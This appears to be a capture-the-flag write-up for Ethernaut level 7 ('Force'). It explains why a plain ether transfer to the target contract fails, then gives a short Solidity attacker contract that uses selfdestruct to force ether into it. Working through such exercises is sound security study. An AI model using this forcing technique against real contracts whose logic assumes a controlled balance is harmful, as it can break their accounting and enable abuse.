# Level 7: [Force](https://ethernaut.openzeppelin.com/level/0x46f79002907a025599f355A04A512A6Fd45E671B)

## Level objectives:
1. Increase the balance of the contract to greater than zero.

## Analysis (lol)
- Contract doesn't have a fallback method or a receive() function to accept ether. That's why the
following tx fails.
```sol
web3.eth.sendTransaction({
  from: "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4",
  to: "0xB1f65625833F4F4af6A0aE5bEE69C186A2704500",
  value: web3.utils.toWei("0.00001", "ether")
})
```
- But any contract can be **forced** to accept ether when the sender contract self-destructs.

## Steps:
- Attacker contract:
```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract AttackForce {
    function attack(address _victim) public {
        selfdestruct(payable(_victim));
    }

    receive() external payable {}
}
```
- After deployment send some ether to this, and call `attack` with the address of victim.
